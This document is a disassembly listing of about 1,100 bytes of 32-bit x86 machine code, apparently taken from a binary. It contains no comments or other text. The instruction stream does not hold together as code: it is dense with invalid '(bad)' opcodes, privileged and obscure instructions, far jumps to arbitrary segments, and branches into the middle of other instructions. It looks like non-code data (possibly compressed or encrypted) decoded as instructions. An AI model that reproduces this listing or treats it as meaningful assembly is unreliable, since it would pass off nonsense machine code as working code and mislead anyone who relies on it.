  407d86:	mov    esp,0x1e425791
  407d8b:	xor    bh,BYTE PTR ss:[esi+0x5e1d39ef]
  407d92:	mov    bl,0x5f
  407d94:	icebp  
  407d95:	ins    BYTE PTR es:[edi],dx
  407d96:	jp     0x407d40
  407d98:	sti    
  407d99:	push   esp
  407d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d9b:	fadd   QWORD PTR [edx-0x55]
  407d9e:	loopne 0x407de9
  407da0:	or     al,0x8
  407da2:	outs   dx,DWORD PTR ds:[esi]
  407da3:	mov    al,ds:0xb4967a26
  407da8:	and    al,0x2
  407daa:	neg    BYTE PTR [ecx-0x17d05bcb]
  407db0:	mov    esi,0x3e3dad55
  407db5:	aad    0xac
  407db7:	fsub   DWORD PTR [ebp-0x3e]
  407dba:	push   0x9cfc06cb
  407dbf:	push   ds
  407dc0:	int3   
  407dc1:	dec    edx
  407dc2:	jno    0x407dfc
  407dc4:	gs ret 
  407dc6:	sahf   
  407dc7:	or     ah,dl
  407dc9:	js     0x407da9
  407dcb:	cmp    eax,0x77014c65
  407dd0:	jl     0x407e42
  407dd2:	rcr    al,0xbc
  407dd5:	ins    BYTE PTR es:[edi],dx
  407dd6:	test   dh,ah
  407dd8:	add    DWORD PTR [esi-0x4939faa5],esi
  407dde:	push   ecx
  407ddf:	xlat   BYTE PTR ds:[ebx]
  407de0:	sbb    cl,BYTE PTR [esi+0x2a1d4735]
  407de6:	cmp    dl,bl
  407de8:	push   0xffffffcd
  407dea:	add    edi,DWORD PTR [ebp+0x56f2d970]
  407df0:	in     al,dx
  407df1:	das    
  407df2:	xchg   BYTE PTR [edx+0x33c47573],ch
  407df8:	xlat   BYTE PTR ds:[ebx]
  407df9:	pop    ds
  407dfa:	(bad)  
  407dfb:	lods   al,BYTE PTR ds:[esi]
  407dfc:	pop    ebp
  407dfd:	arpl   WORD PTR [edx-0x72],cx
  407e00:	daa    
  407e01:	sub    DWORD PTR [edx],edx
  407e03:	cmp    eax,0xe79e34fc
  407e08:	stos   BYTE PTR es:[edi],al
  407e09:	mov    ch,0x4d
  407e0b:	mov    esi,0x1be71d8a
  407e10:	xchg   edx,eax
  407e11:	outs   dx,BYTE PTR ds:[esi]
  407e12:	cmp    eax,0xedba84eb
  407e17:	stos   DWORD PTR es:[edi],eax
  407e18:	pop    edx
  407e19:	imul   ecx,DWORD PTR [ebp+0x54],0x71
  407e1d:	jb     0x407e33
  407e1f:	mul    DWORD PTR [eax+0x1b]
  407e22:	cli    
  407e23:	xchg   ebx,eax
  407e24:	test   al,0xc2
  407e26:	ret    0x2ce2
  407e29:	loope  0x407e38
  407e2b:	add    al,0xca
  407e2d:	(bad)  
  407e2e:	call   0x4573af7e
  407e33:	mov    ch,BYTE PTR [ebx+0x7]
  407e36:	nop
  407e37:	and    ecx,edx
  407e39:	cwde   
  407e3a:	xchg   edi,eax
  407e3b:	shr    dh,0xff
  407e3e:	push   esp
  407e3f:	ds int3 
  407e41:	stc    
  407e42:	adc    BYTE PTR [ebp+0x7a],cl
  407e45:	jmp    0x6edf7f45
  407e4a:	mov    ah,0x43
  407e4c:	mov    eax,ds:0x274aafa4
  407e51:	loop   0x407e03
  407e53:	mov    esp,0xea7711f8
  407e58:	push   ebp
  407e59:	or     al,0x69
  407e5b:	jle    0x407e7c
  407e5d:	inc    edi
  407e5e:	adc    eax,0xe871d7c3
  407e63:	(bad)  
  407e64:	rcr    DWORD PTR [ecx-0x158da545],1
  407e6a:	jo     0x407ebc
  407e6c:	xor    al,0xf7
  407e6e:	(bad)  
  407e6f:	addr16 pop ebx
  407e71:	jbe    0x407e66
  407e73:	xchg   DWORD PTR ds:0xba064941,ebp
  407e79:	js     0x407e82
  407e7b:	into   
  407e7c:	add    BYTE PTR ds:[edi+0x7e],0x98
  407e81:	out    dx,eax
  407e82:	pop    es
  407e83:	shl    BYTE PTR [ecx],cl
  407e85:	stc    
  407e86:	mov    ecx,0x54f8d453
  407e8b:	ror    DWORD PTR [esi-0x26],0xf0
  407e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e90:	pop    ebx
  407e91:	retf   0xd004
  407e94:	mov    ah,0xc7
  407e96:	mov    edx,0x14dc2be1
  407e9b:	shl    BYTE PTR [ebp+0x77],cl
  407e9e:	rcr    DWORD PTR fs:[eax+0x3],0x94
  407ea3:	sub    DWORD PTR [esi+0x2d],edi
  407ea6:	add    dl,BYTE PTR [edx-0x70]
  407ea9:	and    eax,0x718889a0
  407eae:	jae    0x407eb0
  407eb0:	cmp    edx,DWORD PTR [edi]
  407eb2:	mov    ds:0x40281306,eax
  407eb7:	or     BYTE PTR [ecx+0x6b],al
  407eba:	loopne 0x407e59
  407ebc:	arpl   WORD PTR [ebp-0x79],ax
  407ebf:	inc    ecx
  407ec0:	and    DWORD PTR [edi],eax
  407ec2:	push   esi
  407ec3:	inc    edi
  407ec4:	pusha  
  407ec5:	cli    
  407ec6:	pop    esi
  407ec7:	cwde   
  407ec8:	push   edi
  407ec9:	mov    BYTE PTR [esi+0x47],ch
  407ecc:	inc    esp
  407ecd:	jmp    0x1b01:0x16c574fa
  407ed4:	jae    0x407ea9
  407ed6:	or     al,0xb2
  407ed8:	push   ebx
  407ed9:	stc    
  407eda:	scas   eax,DWORD PTR es:[edi]
  407edb:	sbb    al,BYTE PTR [ecx-0x10]
  407ede:	int3   
  407edf:	ja     0x407ec5
  407ee1:	arpl   ax,si
  407ee3:	shl    BYTE PTR [ecx+0x26],0xc4
  407ee7:	jp     0x407edf
  407ee9:	icebp  
  407eea:	das    
  407eeb:	inc    edi
  407eec:	repnz cs fs call 0x95f9:0xee42ac47
  407ef6:	or     eax,0x754240fc
  407efb:	dec    eax
  407efc:	dec    ebp
  407efd:	pop    ecx
  407efe:	ficomp DWORD PTR gs:[eax]
  407f01:	fild   QWORD PTR [edx+0x1a47aacd]
  407f07:	outs   dx,BYTE PTR ds:[esi]
  407f08:	(bad)  
  407f09:	shl    DWORD PTR [edi-0x4b],0x8
  407f0d:	mov    al,0x8f
  407f0f:	retf   0xf2ac
  407f12:	(bad)  
  407f13:	popf   
  407f14:	mov    ds:0xfdd58643,al
  407f19:	mov    bh,0xca
  407f1b:	(bad)  
  407f1c:	aam    0x65
  407f1e:	xchg   ebx,eax
  407f1f:	addr16 xor ch,dl
  407f22:	leave  
  407f23:	sti    
  407f24:	push   edx
  407f25:	js     0x407f16
  407f27:	iret   
  407f28:	sub    BYTE PTR ds:0x7e71666e,dh
  407f2e:	inc    ecx
  407f2f:	sub    eax,0x5c82b4f6
  407f34:	jmp    0x32ab:0xa311ff8c
  407f3b:	mov    ds:0xa8520388,al
  407f40:	jle    0x407fb4
  407f42:	jbe    0x407f70
  407f44:	mov    esi,0x86e8ccf5
  407f49:	mov    eax,0x361fce9c
  407f4e:	push   ebx
  407f4f:	cmp    DWORD PTR [ebx-0x4e],0x10
  407f53:	mul    DWORD PTR [ebp+0x60]
  407f56:	scas   al,BYTE PTR es:[edi]
  407f57:	fdiv   DWORD PTR ds:0x7a244ab0
  407f5d:	clc    
  407f5e:	mov    ebx,0x58d5b028
  407f63:	xor    eax,0x13a6578e
  407f68:	(bad)  
  407f69:	aas    
  407f6a:	xchg   esi,eax
  407f6b:	outs   dx,DWORD PTR ds:[esi]
  407f6c:	push   cs
  407f6d:	inc    edx
  407f6e:	xor    ebx,DWORD PTR [ebx]
  407f70:	add    eax,0xc8d349eb
  407f75:	jl     0x407f2a
  407f77:	pop    esi
  407f78:	fdivr  QWORD PTR ds:0xdf16878e
  407f7e:	dec    ebx
  407f7f:	pop    ss
  407f80:	xchg   edx,eax
  407f81:	jns    0x407fb4
  407f83:	daa    
  407f84:	in     al,0xfe
  407f86:	adc    esp,ecx
  407f88:	inc    edx
  407f89:	pop    edi
  407f8a:	xchg   esp,eax
  407f8b:	cmp    eax,0xabb335fb
  407f90:	js     0x407f55
  407f92:	fwait
  407f93:	jmp    0x3751cd4f
  407f98:	mov    eax,DWORD PTR [eax+ecx*2]
  407f9b:	out    0x96,al
  407f9d:	shr    BYTE PTR [esi],1
  407f9f:	jle    0x407f3b
  407fa1:	dec    esp
  407fa2:	retf   0x8f6a
  407fa5:	aaa    
  407fa6:	push   es
  407fa7:	lahf   
  407fa8:	xor    eax,0x40cb4aa
  407fad:	cli    
  407fae:	push   ebp
  407faf:	sbb    DWORD PTR [edi+0x38],ebp
  407fb2:	aam    0x8e
  407fb4:	sub    al,0x40
  407fb6:	pop    eax
  407fb7:	das    
  407fb8:	popf   
  407fb9:	xchg   esp,eax
  407fba:	loope  0x407f7d
  407fbc:	add    eax,0xf73aed61
  407fc1:	or     ecx,DWORD PTR [ecx+0x3291004c]
  407fc7:	mov    al,ds:0xd476a314
  407fcc:	xor    esi,DWORD PTR [edx+0xd71b6b2]
  407fd2:	xor    BYTE PTR es:[edx+0x65d6696a],cl
  407fd9:	pop    edx
  407fda:	jnp    0x407fbe
  407fdc:	pusha  
  407fdd:	pop    edx
  407fde:	sbb    eax,0x113db182
  407fe3:	popa   
  407fe4:	stos   DWORD PTR es:[edi],eax
  407fe5:	test   al,0x47
  407fe7:	pop    es
  407fe8:	ins    DWORD PTR es:[edi],dx
  407fe9:	xor    ecx,DWORD PTR [edx-0x4f]
  407fec:	lock pop ds
  407fee:	sbb    BYTE PTR ds:0x80d502e8,dl
  407ff4:	shr    BYTE PTR [edi],cl
  407ff6:	xchg   bl,cl
  407ff8:	pusha  
  407ff9:	mov    dl,0x44
  407ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ffc:	sbb    al,dh
  407ffe:	aaa    
  407fff:	aam    0xec
  408001:	lahf   
  408002:	sub    al,0x7c
  408004:	push   ss
  408005:	sub    eax,DWORD PTR [ebx+esi*1-0x25]
  408009:	mov    edi,0xb51723f
  40800e:	push   cs
  40800f:	push   ebx
  408010:	dec    ebx
  408011:	cmp    BYTE PTR [ebp+0x77],cl
  408014:	retf   0x384b
  408017:	adc    edi,ebp
  408019:	jae    0x408042
  40801b:	mov    ebp,0x6a6d3541
  408020:	adc    eax,DWORD PTR [edi+0x7a5770d9]
  408026:	xor    eax,0x916a695b
  40802b:	or     ebp,DWORD PTR [eax+eax*8]
  40802e:	ss pop ebp
  408030:	jnp    0x407fdf
  408032:	jmp    0x85dd:0x836be29d
  408039:	fldcw  WORD PTR [ebx-0x1]
  40803c:	mov    bh,al
  40803e:	repnz cmp BYTE PTR [edi+0x7f],0x3e
  408043:	(bad)  
  408044:	retf   
  408045:	retf   0xcef5
  408048:	ins    DWORD PTR es:[edi],dx
  408049:	push   eax
  40804a:	jbe    0x408022
  40804c:	pusha  
  40804d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40804e:	(bad)  
  40804f:	sti    
  408050:	jl     0x408013
  408052:	or     al,0x3
  408054:	and    eax,0xd7793441
  408059:	jne    0x408025
  40805b:	gs push ecx
  40805d:	cmp    DWORD PTR ds:[eax],ebp
  408060:	das    
  408061:	xor    al,0xfd
  408063:	stos   BYTE PTR es:[edi],al
  408064:	xor    eax,0x6f7b0e5
  408069:	pop    es
  40806a:	stos   BYTE PTR es:[edi],al
  40806b:	pop    ss
  40806c:	push   ecx
  40806d:	push   ebp
  40806e:	inc    eax
  40806f:	xor    bh,BYTE PTR [edi-0x5fe55808]
  408075:	push   ds
  408076:	sahf   
  408077:	(bad)  
  408079:	sbb    eax,0x30d827a4
  40807e:	and    DWORD PTR [eax],ebp
  408080:	push   0x220955f5
  408085:	cmp    al,0x3
  408087:	cmp    BYTE PTR [edi+ebp*2],cl
  40808a:	rcr    DWORD PTR ds:0x3080a854,1
  408090:	in     al,dx
  408091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408092:	jbe    0x408034
  408094:	addr16 rcl bh,0xc6
  408098:	xchg   ebp,eax
  408099:	lds    ecx,FWORD PTR [ebx]
  40809b:	mov    BYTE PTR [edx+0xe],bl
  40809e:	lea    ebp,[ecx-0x1f0de57f]
  4080a4:	xchg   ecx,eax
  4080a5:	sub    ah,bl
  4080a7:	sbb    eax,0xf0ac27f0
  4080ac:	jne    0x408034
  4080ae:	stc    
  4080af:	push   ds
  4080b0:	test   eax,0x52ded4b2
  4080b5:	or     eax,0x8aae8068
  4080ba:	or     DWORD PTR [ecx],esp
  4080bc:	jno    0x40804c
  4080be:	inc    ebx
  4080bf:	jae    0x408049
  4080c1:	out    dx,eax
  4080c2:	sbb    ebx,DWORD PTR [edx-0x5b]
  4080c5:	(bad)  
  4080c6:	adc    DWORD PTR [ecx-0x23],esp
  4080c9:	aaa    
  4080ca:	push   ebx
  4080cb:	add    al,0x23
  4080cd:	pusha  
  4080ce:	mov    ?,WORD PTR [esp+esi*2+0x16b5f436]
  4080d5:	jo     0x4080bb
  4080d7:	mov    dl,0xdc
  4080d9:	fdiv   DWORD PTR [ecx]
  4080db:	xor    DWORD PTR [esp+esi*4],eax
  4080de:	add    eax,0xc0152cb1
  4080e3:	outs   dx,BYTE PTR ds:[esi]
  4080e4:	cdq    
  4080e5:	and    bh,dh
  4080e7:	stc    
  4080e8:	stos   DWORD PTR es:[edi],eax
  4080e9:	fld    TBYTE PTR [esi+0x68578922]
  4080ef:	sar    esp,1
  4080f1:	push   es
  4080f2:	push   es
  4080f3:	cmp    BYTE PTR [edx],ch
  4080f5:	ficomp DWORD PTR [edx]
  4080f7:	test   eax,0x20a59b9d
  4080fc:	inc    edi
  4080fd:	mul    DWORD PTR [ebx+0x45]
  408100:	mov    DWORD PTR [eax+0x7bfb063],ebp
  408106:	mov    DWORD PTR [ecx+0x3022a68c],eax
  40810c:	sub    al,BYTE PTR [eax-0x5e8bcbd3]
  408112:	inc    edx
  408113:	scas   al,BYTE PTR es:[edi]
  408114:	push   edx
  408115:	sub    dl,bh
  408117:	xchg   ebp,eax
  408118:	outs   dx,BYTE PTR ds:[esi]
  408119:	jno    0x4080b4
  40811b:	inc    DWORD PTR [ebx+0x2f]
  40811e:	repnz pop ebp
  408120:	sbb    eax,0xe208a6e5
  408125:	mov    esp,0x395eb39c
  40812a:	inc    DWORD PTR [ecx-0x3a8e1d14]
  408130:	idiv   BYTE PTR [esi*2-0x64b2ad97]
  408137:	shl    BYTE PTR [ebx],cl
  408139:	retf   0xb076
  40813c:	xchg   esp,eax
  40813d:	cli    
  40813e:	jg     0x4081b2
  408140:	test   al,0x21
  408142:	or     eax,DWORD PTR [edi-0x64fa5537]
  408148:	into   
  408149:	sub    ebp,esp
  40814b:	inc    ebp
  40814c:	cmp    al,0x13
  40814e:	test   eax,0x808bbd7
  408153:	xchg   BYTE PTR [edi+eiz*1],ch
  408156:	pop    esp
  408157:	in     al,dx
  408158:	fldcw  WORD PTR [ecx]
  40815a:	ins    BYTE PTR es:[edi],dx
  40815b:	call   FWORD PTR [eax]
  40815d:	scas   eax,DWORD PTR es:[edi]
  40815e:	or     eax,0x67778b97
  408163:	add    BYTE PTR [esp+ecx*2-0x72ebf65e],dh
  40816a:	cwde   
  40816b:	popf   
  40816c:	jmp    0x4081be
  40816e:	mov    ds:0xa5009f73,eax
  408173:	mov    eax,ds:0x6e0c1fd3
  408178:	xor    bl,BYTE PTR [ebp-0x71]
  40817b:	mov    ds:0xa80e7d13,al
  408180:	test   DWORD PTR [eax+eax*2-0x5],esp
  408184:	jmp    0x408189
  408186:	or     DWORD PTR [ecx+eiz*8],ecx
  408189:	dec    esp
  40818a:	pop    ss
  40818b:	(bad)  
  40818c:	fwait
  40818d:	ds lahf 
  40818f:	or     BYTE PTR [ecx+0x49131678],dl
  408195:	sahf   
  408196:	imul   BYTE PTR [edi+eiz*1-0x72]
  40819a:	sub    DWORD PTR es:[ebx+0x3f96811d],ebp
  4081a1:	cs mov ah,0x87
  4081a4:	repnz cdq 
  4081a6:	push   ds
  4081a7:	mov    al,0x72
  4081a9:	xchg   ebp,eax
  4081aa:	cld    
  4081ab:	xlat   BYTE PTR ds:[ebx]
  4081ac:	adc    BYTE PTR [ebp-0x20],bh
  4081af:	adc    bh,ah
  4081b1:	fs (bad) 
  4081b3:	mov    edx,0x4a34713f
  4081b8:	in     al,dx
  4081b9:	dec    esp
  4081ba:	cmp    dl,bh
  4081bc:	(bad)  
  4081bd:	daa    
  4081be:	and    DWORD PTR [edx-0x4d],ecx
  4081c1:	xchg   ebp,eax
  4081c2:	fldenv [edx+0x6e]
  4081c5:	inc    edi
  4081c6:	aaa    
  4081c7:	test   al,0xd9
  4081c9:	out    dx,al
  4081ca:	sub    eax,0xa121c794
  4081cf:	inc    esp
  4081d0:	sub    BYTE PTR [ebp+0x20],dl
  4081d3:	(bad)  
  4081d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d6:	std    
  4081d7:	clc    
  4081d8:	jmp    0x55772038
  4081dd:	sahf   
  4081de:	mov    eax,DWORD PTR [ebp+0x2cd630ed]
  4081e4:	xchg   ebx,eax
  4081e5:	dec    ecx
  4081e6:	cmp    ecx,DWORD PTR [ebp-0x7700f60]
  4081ec:	add    eax,0xac7985fd
  4081f1:	call   0x6f652db8
  4081f6:	call   0x4c2f:0x2d0242cf
  4081fd:	ds sub dl,0xdf
  408201:	jle    0x40826a
  408203:	cs pop es
  408205:	push   edi
  408206:	adc    al,0x10
  408208:	mov    dl,0xa7
  40820a:	leave  
  40820b:	pop    ss
  40820c:	jge    0x408204
  40820e:	xor    ah,BYTE PTR [ebx]
  408210:	mov    ch,0xb7
  408212:	xor    esi,esi
  408214:	fsubr  QWORD PTR ds:0x419b36ce
  40821a:	jl     0x4081c7
  40821c:	daa    
  40821d:	sbb    DWORD PTR [edx-0x52be1aad],ecx
  408223:	iret   
  408224:	xlat   BYTE PTR ds:[ebx]
  408225:	test   BYTE PTR [edi-0x5b],dl
  408228:	xlat   BYTE PTR ds:[ebx]
  408229:	push   edi
  40822a:	les    ebp,FWORD PTR [ecx]
  40822c:	je     0x40821e
  40822e:	pushf  
  40822f:	xchg   edx,eax
  408230:	adc    esi,DWORD PTR [eax+0x6]
  408233:	out    0xcd,al
  408235:	pop    esi
  408236:	inc    ebp
  408237:	fwait
  408238:	inc    ebx
  408239:	(bad)  
  40823a:	jl     0x408215
  40823c:	mov    eax,0xedcb8101
  408241:	mov    edx,0x42bed791
  408246:	addr16 jnp 0x408258
  408249:	test   eax,0xc4e9013b
  40824e:	ret    
  40824f:	leave  
  408250:	inc    esp
  408251:	std    
  408252:	test   DWORD PTR [edi-0x6fbd3f15],esp
  408258:	jg     0x40823d
  40825a:	aad    0xbf
  40825c:	lea    esp,[edi-0x5170702]
  408262:	sbb    DWORD PTR [esi+esi*8+0x4f],eax
  408266:	jmp    0x408279
  408268:	push   0x4d2eda6d
  40826d:	loop   0x408237
  40826f:	aad    0xda
  408271:	sub    BYTE PTR [ecx-0x37256b47],al
  408277:	adc    eax,0xd9ec07f
  40827c:	jnp    0x4082bc
  40827e:	ja     0x4082bb
  408280:	pop    ds
  408281:	add    BYTE PTR [eax+0xd1db064],dl
  408287:	(bad)  
  408288:	push   edx
  408289:	jmp    0xb2aebeb
  40828e:	aad    0xab
  408290:	pop    esi
  408291:	adc    eax,0x4229ff52
  408296:	mov    BYTE PTR [ecx-0x9a7b86b],al
  40829c:	push   0xba8db3cc
  4082a1:	stos   DWORD PTR es:[edi],eax
  4082a2:	mov    ah,0x66
  4082a4:	stc    
  4082a5:	inc    ecx
  4082a6:	(bad)  
  4082a7:	sub    ebp,esi
  4082a9:	call   0x42083e1e
  4082ae:	xchg   edi,eax
  4082af:	mov    ds:0x9cc1d80b,al
  4082b4:	aaa    
  4082b5:	jmp    0x4082c8
  4082b7:	lds    edx,FWORD PTR [ebx]
  4082b9:	add    DWORD PTR [ebx+0x5fd83fea],0x7d84aa61
  4082c3:	mov    edi,0xbcd34e61
  4082c8:	je     0x408268
  4082ca:	call   0xfc8c3ed8
  4082cf:	xchg   esp,eax
  4082d0:	lahf   
  4082d1:	mov    BYTE PTR [ebx],dl
  4082d3:	loope  0x4082a9
  4082d5:	ret    
  4082d6:	pop    esi
  4082d7:	cdq    
  4082d8:	test   esi,0x1c082449
  4082de:	adc    BYTE PTR [edx+eiz*8],bh
  4082e1:	ret    
  4082e2:	jae    0x408310
  4082e4:	rol    DWORD PTR [esi+0x1d3f5b22],1
  4082ea:	push   edx
  4082eb:	mov    al,ds:0x53eaf574
  4082f0:	bts    esp,ebx
  4082f3:	push   edx
  4082f4:	pop    esp
  4082f5:	push   esi
  4082f6:	fld    st(0)
  4082f8:	test   DWORD PTR [esp+ebx*1+0x7b],ebp
  4082fc:	xor    eax,0x583ae3c4
  408301:	call   0xb7050c46
  408306:	lea    esi,[ecx]
  408308:	(bad)  [ebx-0x7f]
  40830b:	cli    
  40830c:	(bad)  
  40830d:	mov    bl,0x39
  40830f:	imul   edx,ebp,0xfbd62b6d
  408315:	fcom   QWORD PTR [ecx-0x64]
  408318:	nop
  408319:	push   edx
  40831a:	test   eax,0xe635979
  40831f:	test   eax,0x1c6c2b89
  408324:	imul   DWORD PTR [ebp+0x1df4726d]
  40832a:	add    bh,BYTE PTR [edx-0x161f8491]
  408330:	jo     0x40837e
  408332:	ss aad 0xfd
  408335:	jae    0x40832f
  408337:	dec    DWORD PTR [edi-0x10a7b0ac]
  40833d:	(bad)  
  40833e:	addr16 pop esi
  408340:	scas   eax,DWORD PTR es:[edi]
  408341:	ret    0xe822
  408344:	pop    ebp
  408345:	mov    ebp,0xb5934669
  40834a:	outs   dx,DWORD PTR ds:[esi]
  40834b:	fisttp WORD PTR [ebx+0x6ed60840]
  408351:	cmp    al,BYTE PTR [edi]
  408353:	stos   BYTE PTR es:[edi],al
  408354:	jge    0x408382
  408356:	daa    
  408357:	and    eax,0x7d90dcf5
  40835c:	sbb    BYTE PTR [esi-0x2c],al
  40835f:	leave  
  408360:	xor    eax,DWORD PTR [eax+0x59]
  408363:	pop    esi
  408364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408365:	popa   
  408366:	icebp  
  408367:	sahf   
  408368:	add    BYTE PTR [ecx],0xc4
  40836b:	add    dl,BYTE PTR [edi+ebp*8]
  40836e:	and    bh,dh
  408370:	div    eax
  408372:	sub    DWORD PTR [eax-0x58fef77f],esi
  408378:	xor    esi,eax
  40837a:	pop    ss
  40837b:	fnstcw WORD PTR [edx-0x7b152395]
  408381:	shl    BYTE PTR [edx-0x540cf786],0x5c
  408388:	jo     0x408388
  40838a:	icebp  
  40838b:	sbb    dh,BYTE PTR [edi+edx*8]
  40838e:	neg    DWORD PTR [eax-0x6de1158d]
  408394:	jge    0x4083c5
  408396:	not    ebp
  408398:	rcr    BYTE PTR [ecx+eax*8+0x6c],0x4c
  40839d:	invd   
  40839f:	mov    ch,0xaf
  4083a1:	mul    eax
  4083a3:	jns    0x4083e9
  4083a5:	mov    dl,0x28
  4083a7:	cmp    dl,ch
  4083a9:	push   eax
  4083aa:	iret   
  4083ab:	xor    al,0xb
  4083ad:	mov    dh,0x35
  4083af:	or     eax,DWORD PTR [ebp+0x6a]
  4083b2:	fwait
  4083b3:	jae    0x40840f
  4083b5:	test   DWORD PTR [eax+0x3],eax
  4083b8:	fmul   st,st(4)
  4083ba:	add    ah,bl
  4083bc:	xor    BYTE PTR [ecx+0x594887dc],0xb3
  4083c3:	loopne 0x408365
  4083c5:	mov    eax,ds:0x571aec2
  4083ca:	mov    ecx,eax
  4083cc:	ds mov ecx,0x898c3a4d
  4083d2:	lea    edx,[edx-0x3d]
  4083d5:	mov    ah,0xdf
  4083d7:	mov    BYTE PTR [ebx+0x5ea3d5e2],ch
  4083dd:	fs sti 
  4083df:	xchg   ebx,eax
  4083e0:	dec    edi
  4083e1:	xchg   BYTE PTR [ecx-0x17],al
  4083e4:	xchg   esp,eax
  4083e5:	mov    ds:0xff3f0d52,eax
  4083ea:	xchg   edi,eax
  4083eb:	icebp  
  4083ec:	or     al,BYTE PTR [ecx]
  4083ee:	repz mov al,0x98
  4083f1:	lods   eax,DWORD PTR ds:[esi]
  4083f2:	aas    
  4083f3:	mov    ds:0xec6d3c3d,al
  4083f8:	test   eax,0xa0375d5c
  4083fd:	in     eax,dx
  4083fe:	push   0x5fb1c2f0
  408403:	pop    es
  408404:	pop    edx
  408405:	std    
  408406:	test   BYTE PTR [edi-0x170317e5],ah
  40840c:	les    edi,FWORD PTR [ecx+0x1a]
  40840f:	pop    ss
  408410:	inc    ebp
  408411:	mov    eax,0x95d70d
  408416:	call   DWORD PTR [ebx+0x1b762d2b]
  40841c:	rcl    BYTE PTR [ebp+0x24be6d48],1
  408422:	lods   eax,DWORD PTR ds:[esi]
  408423:	xchg   esi,eax
  408424:	(bad)  
  408425:	xchg   edx,eax
  408426:	xor    BYTE PTR [edi],bh
  408428:	or     al,0x2c
  40842a:	inc    edx
  40842b:	push   0x31c4fd0b
  408430:	or     BYTE PTR [esi],cl
  408432:	xchg   esi,eax
  408433:	push   0x720f48a
  408438:	jecxz  0x408409
  40843a:	fnstsw WORD PTR ds:0xc2abd52a
  408440:	sysexit 
  408442:	or     cl,BYTE PTR [ebx]
  408444:	jns    0x408460
  408446:	push   cs
  408447:	outs   dx,BYTE PTR ds:[esi]
  408448:	xchg   esi,eax
  408449:	fiadd  WORD PTR [edx]
  40844b:	jecxz  0x4083fa
  40844d:	push   eax
  40844e:	dec    eax
  40844f:	popa   
  408450:	aaa    
  408451:	pop    ds
  408452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408453:	add    cl,ch
  408455:	pop    ebx
  408456:	cmp    dl,dh
  408458:	das    
  408459:	push   cs
  40845a:	jbe    0x40840c
  40845c:	inc    eax
  40845d:	adc    al,0x27
  40845f:	sti    
  408460:	jo     0x40844d
  408462:	sub    esi,ebx
  408464:	mov    fs,ebp
  408466:	push   ebp
  408467:	inc    ebx
  408468:	mov    ah,0x9a
  40846a:	mov    ebx,0xd6ecda1
  40846f:	test   eax,0xd6130cd9
  408474:	test   al,0x74
  408476:	outs   dx,BYTE PTR ds:[esi]
  408477:	not    DWORD PTR [edi-0x77e1ee44]
  40847d:	test   BYTE PTR [eax+eiz*8],dh
  408480:	dec    ebp
  408481:	or     esi,DWORD PTR [eax-0x73]
  408484:	and    ah,ch
  408486:	mov    cl,0x35
  408488:	aam    0xd1
  40848a:	sbb    ch,BYTE PTR [edx+0x4cc1be1c]
  408490:	jne    0x4084f3
  408492:	and    ecx,edi
  408494:	ins    BYTE PTR es:[edi],dx
  408495:	push   ecx
  408496:	les    eax,FWORD PTR [ebp-0x7f]
  408499:	sub    eax,0xd9f901c3
  40849e:	xor    BYTE PTR [eax-0x315a2898],bh
  4084a4:	jns    0x408483
  4084a6:	xchg   ebx,eax
  4084a7:	int3   
  4084a8:	xor    eax,0xa7a3aaa
  4084ad:	or     DWORD PTR [ecx+esi*8],0xf5a63e49
  4084b4:	pushf  
  4084b5:	pop    es
  4084b6:	xchg   BYTE PTR [ebp+0x46],al
  4084b9:	push   es
  4084ba:	adc    DWORD PTR [edx+ebp*2-0x25],0xffffff9d
  4084bf:	pop    ebx
  4084c0:	js     0x4084ab
  4084c2:	pop    ecx
  4084c3:	inc    edx
  4084c4:	fist   DWORD PTR [edi+ebp*8]
  4084c7:	call   0xb1a:0xcd6ef40
  4084ce:	cmp    DWORD PTR [ecx+0x7dd384e4],esp
  4084d4:	or     al,0x83
  4084d6:	mov    al,ds:0x6346eb82
  4084db:	icebp  
  4084dc:	jne    0x408530
  4084de:	push   0x11
  4084e0:	jno    0x4084ca
  4084e2:	fbld   TBYTE PTR [edi-0xc4ce59f]
  4084e8:	ss loopne 0x40851f
  4084eb:	ret    0xf997
  4084ee:	scas   eax,DWORD PTR es:[edi]
  4084ef:	fs xor al,0x14
  4084f2:	xchg   edi,eax
  4084f3:	xor    edx,0xdcd64328
  4084f9:	cld    
  4084fa:	loopne 0x4084f9
  4084fc:	mov    edx,0xeb6d4533
  408501:	in     eax,0x34
  408503:	neg    DWORD PTR [edi-0x7be470fe]
  408509:	and    DWORD PTR [ecx-0x71],ecx
  40850c:	fwait
  40850d:	neg    BYTE PTR [ebx-0x50b77470]
  408513:	and    DWORD PTR [ebp+0x23],0xffffffd0
  408517:	xchg   esp,eax
  408518:	scas   al,BYTE PTR es:[edi]
  408519:	jmp    0xad832d76
  40851e:	fs pop ds
  408520:	out    dx,eax
  408521:	popf   
  408522:	add    eax,0xc8ae6d27
  408527:	mov    edx,0x15dea6f3
  40852c:	jae    0x40855f
  40852e:	retf   0xf431
  408531:	mov    esi,esp
  408533:	xchg   esi,eax
  408534:	fild   DWORD PTR [ebp-0xc]
  408537:	pop    es
  408538:	pop    esp
  408539:	lock add esp,DWORD PTR [edx-0x318dc8a7]
  408540:	inc    edi
  408541:	dec    eax
  408542:	mov    al,cl
  408544:	mov    ds:0x4087acfa,eax
  408549:	or     DWORD PTR [esi+0x6eed0ba],ebx
  40854f:	int    0x22
  408551:	sahf   
  408552:	cmp    bh,dh
  408554:	hlt    
  408555:	jg     0x408592
  408557:	sbb    BYTE PTR [esi+0x13186c3d],0x4
  40855e:	int3   
  40855f:	js     0x4084fb
  408561:	pop    edi
  408562:	inc    edx
  408563:	repnz mov ch,0x8d
  408566:	daa    
  408567:	int3   
  408568:	mov    ds:0x75b2553a,al
  40856d:	jmp    0xb8b3edde
  408572:	jbe    0x4085ec
  408574:	xchg   ebp,eax
  408575:	repnz sbb al,0x5d
  408578:	and    ecx,DWORD PTR ds:0xdf9caf3
  40857e:	cmp    al,0x26
  408580:	push   ebp
  408581:	loope  0x4085d2
  408583:	retf   
  408584:	mov    bl,0xcf
  408586:	add    bh,ah
  408588:	adc    ebx,DWORD PTR [esi+0x28]
  40858b:	inc    edx
